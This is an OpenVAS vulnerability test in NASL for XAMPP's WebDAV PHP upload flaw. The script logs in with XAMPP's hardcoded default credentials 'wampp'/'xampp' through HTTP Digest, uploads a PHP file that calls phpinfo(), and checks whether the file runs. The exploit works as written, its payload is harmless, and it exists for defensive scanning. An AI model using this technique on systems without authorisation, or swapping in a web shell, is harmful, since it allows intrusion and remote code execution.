###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_xampp_webdav_php_upload_vuln.nasl 13994 2019-03-05 12:23:37Z cfischer $
#
# XAMPP WebDAV PHP Upload Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802293");
  script_version("$Revision: 13994 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2012-01-17 12:12:12 +0530 (Tue, 17 Jan 2012)");
  script_name("XAMPP WebDAV PHP Upload Vulnerability");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/72397");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18367");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/108420/xampp_webdav_upload_php.rb.txt");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_xampp_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("xampp/installed");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to gain
  unauthorized access to the system.");
  script_tag(name:"affected", value:"XAMPP");

  script_tag(name:"insight", value:"The flaw exists because XAMPP contains a default username and
  password within the WebDAV folder, which allows attackers to gain unauthorized access to the system.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.

  A Workaround is to delete or change the default webdav password file.");

  script_tag(name:"summary", value:"This host is running XAMPP and prone to PHP upload
  vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://serverpress.com/topic/xammp-webdav-security-patch/");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);
if (! xamppVer = get_kb_item("www/" + port + "/XAMPP"))
  exit(0);

vtstrings = get_vt_strings();
host = http_host_name(port:port);

url = "/webdav/" + vtstrings["lowercase_rand"] + ".php";
req = http_put(item:url, port:port);
res = http_keepalive_send_recv(port:port, data:req);

nonce = eregmatch(pattern:'nonce="([^"]*)', string:res);
if(isnull(nonce[1]))
  exit(0);

nonce = nonce[1];
useragent = http_get_user_agent();

cnonce = rand();  ## Client Nonce
qop = "auth";     ## Quality of protection code
nc = "00000001";  ## nonce-count

ha1 = hexstr(MD5("wampp:XAMPP with WebDAV:xampp"));
ha2 = hexstr(MD5("PUT:" + url));
response = hexstr(MD5(string(ha1,":",nonce,":",nc,":",cnonce,":",qop,":",ha2)));

data = "<?php phpinfo();?>";
req = string("PUT ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             'Authorization: Digest username="wampp", realm="XAMPP with WebDAV",',
             'nonce="',nonce,'",', 'uri="',url,'", algorithm=MD5,',
             'response="', response,'", qop=', qop,', nc=',nc,', cnonce="',cnonce,'"',"\r\n",
             "Content-Length: ", strlen(data), "\r\n\r\n", data);
res = http_keepalive_send_recv(port:port, data:req);

if(res =~ "^HTTP/1\.[01] 201")
{
  if(http_vuln_check(port:port, url:url, pattern:">phpinfo\(\)<")){
    security_message(port);
    exit(0);
  }
}

exit(99);